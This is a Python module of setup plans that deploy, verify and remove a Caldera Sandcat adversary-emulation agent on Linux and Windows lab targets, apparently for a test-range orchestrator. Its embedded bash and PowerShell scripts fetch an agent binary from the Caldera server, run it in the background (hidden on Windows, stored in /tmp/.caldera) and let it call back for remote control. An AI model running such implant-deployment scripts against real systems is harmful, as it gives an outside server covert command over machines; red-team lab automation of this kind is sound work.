"""Caldera agent deployment plan.

Defines the steps to fetch and deploy a Caldera (Sandcat) agent on a target
instance, connecting it back to the Caldera server running on the Kali box.

This plan is NOT activated by default - it is designed for future integration
with the setup orchestrator when Caldera functionality is enabled.

Agent download uses the /file/download endpoint which does NOT require
authentication. The agent binary is dynamically compiled by the Caldera
server when GoLang is available.

Reference: https://caldera.readthedocs.io/en/latest/plugins/sandcat/Sandcat-Details.html
"""

from typing import Any, ClassVar

from .base import SetupStep


# Bash script to download and run Sandcat agent on Linux targets
DEPLOY_LINUX_AGENT_SCRIPT = """#!/bin/bash
set -euo pipefail

caldera_server="{{ caldera_server }}"
caldera_group="{{ caldera_group }}"
agent_name="{{ agent_name }}"
agent_dir="{{ agent_dir }}"

echo "Deploying Caldera Sandcat agent..."
echo "Caldera server: $caldera_server"
echo "Agent group: $caldera_group"

# Create agent directory
mkdir -p "$agent_dir"
cd "$agent_dir"

# Download Sandcat agent from Caldera server
# The /file/download endpoint does not require authentication
# Headers specify: file type, platform, and server address to embed
echo "Downloading Sandcat agent from $caldera_server..."
curl -s -X POST \\
    -H "file:sandcat.go" \\
    -H "platform:linux" \\
    -H "server:$caldera_server" \\
    -H "group:$caldera_group" \\
    "$caldera_server/file/download" > "$agent_name"

if [ ! -s "$agent_name" ]; then
    echo "ERROR: Failed to download agent (empty file)"
    exit 1
fi

chmod +x "$agent_name"
echo "Agent downloaded successfully: $agent_dir/$agent_name"

# Start agent in background
echo "Starting agent..."
nohup "./$agent_name" -server "$caldera_server" -group "$caldera_group" > agent.log 2>&1 &

# Give agent time to connect
sleep 5

if pgrep -f "$agent_name" > /dev/null; then
    echo "Caldera agent started successfully"
    echo "Agent is connecting to: $caldera_server"
    exit 0
else
    echo "ERROR: Agent process not found after start"
    cat agent.log 2>/dev/null || true
    exit 1
fi
"""

# PowerShell script to download and run Sandcat agent on Windows targets
DEPLOY_WINDOWS_AGENT_SCRIPT = """
$ErrorActionPreference = "Stop"

$calderaServer = "{{ caldera_server }}"
$calderaGroup = "{{ caldera_group }}"
$agentName = "{{ agent_name }}"
$agentDir = "{{ agent_dir }}"

Write-Host "Deploying Caldera Sandcat agent..."
Write-Host "Caldera server: $calderaServer"
Write-Host "Agent group: $calderaGroup"

# Create agent directory
if (-not (Test-Path $agentDir)) {
    New-Item -ItemType Directory -Path $agentDir -Force | Out-Null
}
Set-Location $agentDir

# Download Sandcat agent from Caldera server
# The /file/download endpoint does not require authentication
Write-Host "Downloading Sandcat agent from $calderaServer..."

$headers = @{
    "file" = "sandcat.go"
    "platform" = "windows"
    "server" = $calderaServer
    "group" = $calderaGroup
}

try {
    Invoke-WebRequest -Uri "$calderaServer/file/download" `
        -Method POST `
        -Headers $headers `
        -OutFile "$agentName.exe" `
        -UseBasicParsing
} catch {
    Write-Host "ERROR: Failed to download agent: $_"
    exit 1
}

if (-not (Test-Path "$agentName.exe") -or (Get-Item "$agentName.exe").Length -eq 0) {
    Write-Host "ERROR: Agent download failed (file empty or missing)"
    exit 1
}

Write-Host "Agent downloaded successfully: $agentDir\\$agentName.exe"

# Start agent in background
Write-Host "Starting agent..."
Start-Process -FilePath ".\\$agentName.exe" `
    -ArgumentList "-server", $calderaServer, "-group", $calderaGroup `
    -WindowStyle Hidden

Start-Sleep -Seconds 5

$agentProcess = Get-Process -Name $agentName -ErrorAction SilentlyContinue
if ($agentProcess) {
    Write-Host "Caldera agent started successfully"
    Write-Host "Agent is connecting to: $calderaServer"
    exit 0
} else {
    Write-Host "ERROR: Agent process not found after start"
    exit 1
}
"""

# Bash script to verify agent is running and connected
VERIFY_LINUX_AGENT_SCRIPT = """#!/bin/bash
set -euo pipefail

agent_name="{{ agent_name }}"

echo "Verifying Caldera agent is running..."

if pgrep -f "$agent_name" > /dev/null; then
    echo "Caldera agent process is running"
    ps aux | grep "$agent_name" | grep -v grep
    exit 0
else
    echo "ERROR: Caldera agent process not found"
    exit 1
fi
"""

# PowerShell script to verify agent is running
VERIFY_WINDOWS_AGENT_SCRIPT = """
$ErrorActionPreference = "Stop"

$agentName = "{{ agent_name }}"

Write-Host "Verifying Caldera agent is running..."

$agentProcess = Get-Process -Name $agentName -ErrorAction SilentlyContinue
if ($agentProcess) {
    Write-Host "Caldera agent process is running"
    Write-Host "PID: $($agentProcess.Id)"
    exit 0
} else {
    Write-Host "ERROR: Caldera agent process not found"
    exit 1
}
"""

# Bash script to stop agent on Linux
STOP_LINUX_AGENT_SCRIPT = """#!/bin/bash
set -euo pipefail

agent_name="{{ agent_name }}"
agent_dir="{{ agent_dir }}"

echo "Stopping Caldera agent..."

if pkill -f "$agent_name"; then
    echo "Caldera agent stopped"
else
    echo "Caldera agent was not running"
fi

# Optionally clean up agent files
if [ -d "$agent_dir" ]; then
    rm -rf "$agent_dir"
    echo "Agent directory cleaned up"
fi

exit 0
"""


class CalderaLinuxAgentDeployPlan:
    """Setup plan to deploy Caldera agent on a Linux target.

    This plan downloads and runs the Sandcat agent from the Caldera
    server, connecting the target to the adversary emulation platform.

    NOT ACTIVATED BY DEFAULT - This plan is designed for future use
    when Caldera functionality is integrated into the orchestration flow.

    Authentication:
    - The /file/download endpoint does NOT require authentication
    - Agent binary is dynamically compiled by the server

    Prerequisites:
    - Caldera server must be running and accessible
    - Target must have network connectivity to Caldera server
    - curl must be available on the target

    Steps:
    1. Download Sandcat agent from Caldera server
    2. Start agent connecting back to server

    Verification:
    - Check agent process is running

    Context variables:
    - caldera_server: Full URL of Caldera server (e.g., http://10.0.0.5:8888)
    - caldera_group: Agent group name (default: red)
    - agent_name: Name for agent binary (default: sandcat)
    - agent_dir: Directory to store agent (default: /tmp/.caldera)
    """

    steps: ClassVar[list[SetupStep]] = [
        SetupStep(
            name="deploy_linux_agent",
            script=DEPLOY_LINUX_AGENT_SCRIPT,
            timeout_seconds=120,
            requires_reboot=False,
        ),
    ]

    verify_step: ClassVar[SetupStep] = SetupStep(
        name="verify_linux_agent",
        script=VERIFY_LINUX_AGENT_SCRIPT,
        timeout_seconds=30,
        is_verification=True,
    )

    def get_context(self, instance: Any) -> dict[str, Any]:
        """Get template variables for Linux agent deployment.

        Args:
            instance: Instance with caldera_server attribute (required)
                     and optional caldera_group, agent_name, agent_dir

        Returns:
            Dict with caldera_server, caldera_group, agent_name, agent_dir

        Raises:
            ValueError: If caldera_server is missing
        """
        caldera_server = getattr(instance, "caldera_server", None)
        if not caldera_server:
            raise ValueError(
                "Instance missing required 'caldera_server' attribute for Caldera agent deployment"
            )

        return {
            "caldera_server": caldera_server,
            "caldera_group": getattr(instance, "caldera_group", "red"),
            "agent_name": getattr(instance, "agent_name", "sandcat"),
            "agent_dir": getattr(instance, "agent_dir", "/tmp/.caldera"),
        }


class CalderaWindowsAgentDeployPlan:
    """Setup plan to deploy Caldera agent on a Windows target.

    This plan downloads and runs the Sandcat agent from the Caldera
    server, connecting the target to the adversary emulation platform.

    NOT ACTIVATED BY DEFAULT - This plan is designed for future use
    when Caldera functionality is integrated into the orchestration flow.

    Authentication:
    - The /file/download endpoint does NOT require authentication
    - Agent binary is dynamically compiled by the server

    Prerequisites:
    - Caldera server must be running and accessible
    - Target must have network connectivity to Caldera server
    - PowerShell must be available on the target

    Steps:
    1. Download Sandcat agent from Caldera server
    2. Start agent connecting back to server

    Verification:
    - Check agent process is running

    Context variables:
    - caldera_server: Full URL of Caldera server (e.g., http://10.0.0.5:8888)
    - caldera_group: Agent group name (default: red)
    - agent_name: Name for agent binary (default: sandcat)
    - agent_dir: Directory to store agent (default: C:\\ProgramData\\Caldera)
    """

    steps: ClassVar[list[SetupStep]] = [
        SetupStep(
            name="deploy_windows_agent",
            script=DEPLOY_WINDOWS_AGENT_SCRIPT,
            timeout_seconds=180,
            requires_reboot=False,
        ),
    ]

    verify_step: ClassVar[SetupStep] = SetupStep(
        name="verify_windows_agent",
        script=VERIFY_WINDOWS_AGENT_SCRIPT,
        timeout_seconds=30,
        is_verification=True,
    )

    def get_context(self, instance: Any) -> dict[str, Any]:
        """Get template variables for Windows agent deployment.

        Args:
            instance: Instance with caldera_server attribute (required)
                     and optional caldera_group, agent_name, agent_dir

        Returns:
            Dict with caldera_server, caldera_group, agent_name, agent_dir

        Raises:
            ValueError: If caldera_server is missing
        """
        caldera_server = getattr(instance, "caldera_server", None)
        if not caldera_server:
            raise ValueError(
                "Instance missing required 'caldera_server' attribute for Caldera agent deployment"
            )

        return {
            "caldera_server": caldera_server,
            "caldera_group": getattr(instance, "caldera_group", "red"),
            "agent_name": getattr(instance, "agent_name", "sandcat"),
            "agent_dir": getattr(instance, "agent_dir", "C:\\ProgramData\\Caldera"),
        }


class CalderaLinuxAgentStopPlan:
    """Plan to stop and clean up Caldera agent on Linux target.

    NOT ACTIVATED BY DEFAULT - This plan is designed for future use
    when Caldera functionality is integrated into the orchestration flow.
    """

    steps: ClassVar[list[SetupStep]] = [
        SetupStep(
            name="stop_linux_agent",
            script=STOP_LINUX_AGENT_SCRIPT,
            timeout_seconds=30,
            requires_reboot=False,
        ),
    ]

    verify_step: ClassVar[SetupStep | None] = None

    def get_context(self, instance: Any) -> dict[str, Any]:
        """Get template variables for agent stop."""
        return {
            "agent_name": getattr(instance, "agent_name", "sandcat"),
            "agent_dir": getattr(instance, "agent_dir", "/tmp/.caldera"),
        }
